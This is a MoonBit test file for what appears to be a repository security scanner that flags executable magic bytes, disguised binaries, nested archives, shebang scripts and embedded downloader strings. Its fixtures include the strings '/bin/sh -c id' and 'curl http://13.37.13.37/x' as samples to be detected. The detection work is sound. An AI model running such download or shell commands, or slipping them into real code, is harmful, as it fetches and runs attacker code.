///|
test "detect executable magics" {
  inspect(
    @source.detect_binary_magic(b"\x7fELF\x02\x01") is Some(Elf),
    content="true",
  )
  inspect(
    @source.detect_binary_magic(b"\xcf\xfa\xed\xfe") is Some(MachO64),
    content="true",
  )
  inspect(
    @source.detect_binary_magic(b"\xce\xfa\xed\xfe") is Some(MachO32),
    content="true",
  )
  inspect(
    @source.detect_binary_magic(b"\xca\xfe\xba\xbe") is Some(MachOFat),
    content="true",
  )
  inspect(
    @source.detect_binary_magic(b"MZ\x90\x00") is Some(WindowsPE),
    content="true",
  )
  // 非二进制：PNG/文本/wasm 不命中
  inspect(@source.detect_binary_magic(b"\x89PNG\r\n") is None, content="true")
  inspect(@source.detect_binary_magic(b"hello world!") is None, content="true")
  inspect(@source.detect_binary_magic(b"\x00asm") is None, content="true")
}

///|
test "nested archive and script classification" {
  inspect(@source.is_nested_archive("assets/payload.zip"), content="true")
  inspect(@source.is_nested_archive("data/model.tar.gz"), content="true")
  inspect(@source.is_nested_archive("src/lib.mbt"), content="false")
  inspect(@source.is_script_file("scripts/setup.sh"), content="true")
  inspect(@source.is_script_file("scripts/run.py"), content="true")
  inspect(@source.is_script_file("docs.md"), content="false")
}

///|
test "s10 artifact findings by kind" {
  // ELF → High
  let elf = @source.s10_artifact("bin/drop", b"\x7fELF", false, false)
  inspect(elf.length(), content="1")
  inspect(elf[0].severity == High, content="true")
  inspect(elf[0].message.contains("ELF"), content="true")
  // 嵌套压缩包 → Medium
  let zip = @source.s10_artifact("payload.zip", b"PK\x03\x04", true, false)
  inspect(zip.length(), content="1")
  inspect(zip[0].severity == Medium, content="true")
  // 带 shebang 的脚本 → Medium
  let sh = @source.s10_artifact("run.sh", b"#!/bin/sh\n", false, true)
  inspect(sh.length(), content="1")
  inspect(sh[0].message.contains("shebang"), content="true")
  // 普通资源文件不告警
  inspect(
    @source.s10_artifact("logo.png", b"\x89PNG", false, false).length(),
    content="0",
  )
}

///|
test "extract_ascii_strings finds printable runs" {
  let data = b"\x00\x01hello world\x00/bin/sh -c id\xff\xfe"
  let strs = @source.extract_ascii_strings(data, 6)
  inspect(strs.length(), content="2")
  inspect(strs[0], content="hello world")
  inspect(strs[1], content="/bin/sh -c id")
}

///|
test "disguised executable is flagged" {
  // .png 扩展名 + ELF 魔数 → 伪装（High）
  let fake = b"\x7fELF\x02\x01\x01\x00" + b"\x00".repeat(32)
  let fs = @source.s10_artifact("assets/logo.png", fake, false, false)
  inspect(fs.length(), content="2")
  inspect(fs.iter().any(f => f.message.contains("disguised")), content="true")
}

///|
test "binary with embedded downloader strings escalates to critical" {
  // ELF 内嵌 "curl http://13.37.13.37/x" 字符串 → Critical
  let elf = b"\x7fELF" +
    b"\x00".repeat(8) +
    b"curl http://13.37.13.37/x" +
    b"\x00".repeat(4)
  let fs = @source.s10_artifact("bin/tool", elf, false, false)
  inspect(fs.length(), content="2")
  inspect(
    fs
    .iter()
    .any(f => f.severity == Critical && f.message.contains("downloader")),
    content="true",
  )
}

///|
test "plain text files with benign content stay silent" {
  // 普通文本（无魔数）不触发内嵌字符串检查
  let text = b"just a readme line with words enough length"
  inspect(
    @source.s10_artifact("notes.txt", text, false, false).length(),
    content="0",
  )
}
